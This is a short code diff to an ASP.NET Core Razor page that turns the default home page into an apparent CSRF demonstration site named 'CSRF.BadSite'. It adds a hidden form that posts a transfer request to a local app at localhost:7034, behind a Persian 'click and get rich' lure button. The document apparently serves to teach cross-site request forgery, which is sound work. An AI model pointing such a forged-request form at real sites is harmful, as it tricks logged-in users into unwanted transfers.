@@ -2,7 +2,14 @@
     ViewData["Title"] = "Home Page";
 }
 
-<div class="text-center">
-    <h1 class="display-4">Welcome</h1>
-    <p>Learn about <a href="https://docs.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
+<div class="">
+    <h1 class="display-4">CSRF.BadSite</h1>
+    <p>Click on the following button cause losing all latest login user's Emtiaz !</p>
 </div>
+
+<form method="post" action="https://localhost:7034/Home/Transfer">
+    <input class="form-control" type="hidden" value="1" name="destinationCustomerId" />
+    <br />
+    <input class="btn btn-danger" type="submit" value="کلیک کنید و پولدار شوید" />
+    <br />
+</form>
